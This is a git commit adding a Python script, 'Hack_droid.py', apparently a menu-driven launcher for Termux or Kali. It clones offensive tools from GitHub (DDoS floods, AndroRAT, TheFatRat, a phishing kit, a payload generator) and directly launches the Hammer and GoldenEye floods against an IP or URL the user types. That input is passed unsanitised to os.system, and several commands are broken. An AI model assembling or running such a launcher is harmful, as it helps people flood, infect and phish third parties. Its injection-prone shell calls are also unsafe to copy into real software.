667a031993d80879375fc3497e1f805760970ec3
BOMBX002 <132835318+bombx002@users.noreply.github.com>
2023-12-11 22:04:28 +0530

    Add files via upload

---
+++ Hack_droid.py
@@ -0,0 +1,167 @@
+import os 
+from colorama import Fore, Back, Style
+import time 
+os.system('apt update -y && apt upgrade -y')
+os.system('pip install colorama')
+os.system('clear')
+print ('𝐍𝐨𝐰 𝐥𝐨𝐚𝐝𝐢𝐧𝐠...')
+time.sleep(2.0)
+os.system('clear')
+print('''Loading… █▒▒▒▒▒▒▒▒▒''')
+os.system('clear')
+time.sleep(0.8)
+print('''10%███▒▒▒▒▒▒▒\n''')
+os.system('clear')
+time.sleep(0.8)
+print('''30%█████▒▒▒▒▒
+''')
+os.system('clear')
+time.sleep(0.8)
+print('''50%███████▒▒▒\n''')
+os.system('clear')
+time.sleep(0.2)
+print('''███████████████████100%
+\n''')
+os.system('clear')
+time.sleep(1.0)
+os.system('clear')
+print('''
+
+
+
+
+[_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_]
+<_-You entered to the tools section-_>
+=======================================================
+▒▒▒▒▒▒▒▒▒▒ 100% Completed!
+(; D)
+<Grant Access To The Tool!>''')
+time.sleep(1.0)
+main = input('Do You Want To Continue/\n Only type Yes or No: ')
+if main == 'yes' or main == 'Yes' or main == 'y':
+  os.system('clear')
+  
+  print(Fore.BLUE + '''
+██████╗░░█████╗░███╗░░░███╗██████╗░██╗░░██╗
+██╔══██╗██╔══██╗████╗░████║██╔══██╗╚██╗██╔╝
+██████╦╝██║░░██║██╔████╔██║██████╦╝░╚███╔╝░
+██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗░██╔██╗░
+██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝██╔╝╚██╗
+╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚═╝░░╚═╝
+-----------------Created By----------------''')
+time.sleep(1.0)
+print('🅆🄴🄻🄲🄾🄼🄴 🅃🄾 🄷🄰🄲🄺_🄳🅁🄾🄸🄳 🅃🄾🄾🄻🅂')
+time.sleep(0.6)
+menu = ('''
+[1]. hammer-DDos    [2]. hulk-DDos    [3]. DDos-Attack
+
+[4]. AndroRAT       [5]. The_FatRat   [6]. nexPhisher
+
+[7]. Infect         [8]. SQLMap       [9]. Payload
+
+[10]. GoldenEye     [11]. fsociety    [12]. web_were
+
+[99]. Exit ''')
+print(Fore.RED +  menu)
+print(Fore.GREEN)
+options = input("choice yor hack: ")
+if options == "1":
+  os.system('git clone https://github.com/Pavithran-R/Hammer/')
+  print('Your tool is Successfully Installed!!!')
+  main2 = input('Do You Want To Continue the tool and run\n Type y/n: ')
+  if main2 == 'y':
+    print('Operating system hammer-DDos')
+    time.sleep(0.5)
+    os.system('pkg install python')
+    os.system('clear')
+    os.system('ls')
+    os.system('clear')
+    os.system('cd hammer')
+    print('you need to follow this to get ip to run\need follow this :- open 2nd terminal and type :- ping and space then enter you website witout https/http')
+    print('First Read To Enter ip then continue')
+    time.sleep(2.0)
+    function = input('Enter Ip: ')
+    os.system('python hammer.py -s ' + function + ' -p 80 -t 135 ')
+  if main2 == "n":
+    exit
+if options == "2":
+  os.system('git clone https://github.com/grafov/hulk')
+  print('Your tool is Successfully Installed!!!')
+if options == "3":
+  os.system('git clone https://github.com/Ha3MrX/DDos-Attack')
+  
+  
+  print('''
+  
+  If This Tool Want,s Password Then Anything in user type name & password\n''')
+  
+if options == "4":
+  state = input('do you want to continue.y/N')
+  if state == 'y':
+    os.system('git clone https://github.com/karma9874/AndroRAT')
+    print(Fore.RED + '''IF YOU ARE MASTER HACKER THEN YOU CAN USE IT EASYLY''')
+if options == "5":
+  os.system('git clone https://github.com/Exploit-install/TheFatRat')
+if options == "6":
+  os.system('git clone https://github.com/htr-tech/nexphisher')
+if options == "7":
+  os.system('git clone https://github.com/noob-hackers/infect')
+if options == "8":
+  os.system('git clone https://github.com/sqlmapproject/sqlmap')
+  print(Fore.RED + 'IF YOU ARE IN PROFESSIONAL IN HACKING SO YOU CAN USE ESEYLY, OR YOU ARE A SCRIPT KID YOU HAVE TO LEARN IT')
+  time.sleep(7.0)
+if options == "9":
+  main3 = input('if you are linux user so type kali or you are termux user so type termux: ')
+  if main3 == 'termux':
+    os.system('git clone https://github.com/Deadpool2000/Paybag')
+    os.system('cd Paybag')
+    os.system('pip install -r requirements.txt')
+    os.system('python paybag.py')
+  if main3 == 'kali':
+    os.system('sudo sudo apt-get install python3 python3-pip net-tools')
+    os.system('git clone https://github.com/Deadpool2000/Paybag.github')
+    os.system('cd Paybag')
+    os.system('sudo pip3 install -r requirements.txt')
+    os.system('python3 paybag.py')
+if options == '10':
+  os.system('git clone https://github.com/jseidl/GoldenEye')
+  os.system('cd GoldenEye')
+  options2 = input('Enter URL: ')
+  os.system('python2 goldeneye.py ' + options2 +'-w 123 -s 200 -d')
+if options == '11':
+  os.system('git clone https://github.com/Manisso/fsociety')
+if options == '12':
+  os.system('git clone https://github.com/bombx002/web_were.git')
+if options == '99':
+  print(Fore.RED + '''
+  
+███╗░░██╗░█████╗░
+████╗░██║██╔══██╗
+██╔██╗██║██║░░██║
+██║╚████║██║░░██║
+██║░╚███║╚█████╔╝
+╚═╝░░╚══╝░╚════╝░
+
+░██████╗██╗░░░██╗░██████╗████████╗███████╗███╗░░░███╗
+██╔════╝╚██╗░██╔╝██╔════╝╚══██╔══╝██╔════╝████╗░████║
+╚█████╗░░╚████╔╝░╚█████╗░░░░██║░░░█████╗░░██╔████╔██║
+░╚═══██╗░░╚██╔╝░░░╚═══██╗░░░██║░░░██╔══╝░░██║╚██╔╝██║
+██████╔╝░░░██║░░░██████╔╝░░░██║░░░███████╗██║░╚═╝░██║
+╚═════╝░░░░╚═╝░░░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░░░░╚═╝
+
+██╗░██████╗
+██║██╔════╝
+██║╚█████╗░
+██║░╚═══██╗
+██║██████╔╝
+╚═╝╚═════╝░
+
+░██████╗░█████╗░███████╗███████╗
+██╔════╝██╔══██╗██╔════╝██╔════╝
+╚█████╗░███████║█████╗░░█████╗░░
+░╚═══██╗██╔══██║██╔══╝░░██╔══╝░░
+██████╔╝██║░░██║██║░░░░░███████╗
+╚═════╝░╚═╝░░╚═╝╚═╝░░░░░╚══════╝''')
+  time.sleep(1.0)
+  print(Fore.GREEN + '🅹🅾🅸🅽 🆄🆂 🅶🆁🅾🆄🅿')
+  print('HACKER Group Site Coming soon ')
---
+++ setup.py
@@ -0,0 +1,3 @@
+import os 
+os.system('apt update -y && apt upgrade -y')
+os.system('pip install colorama')
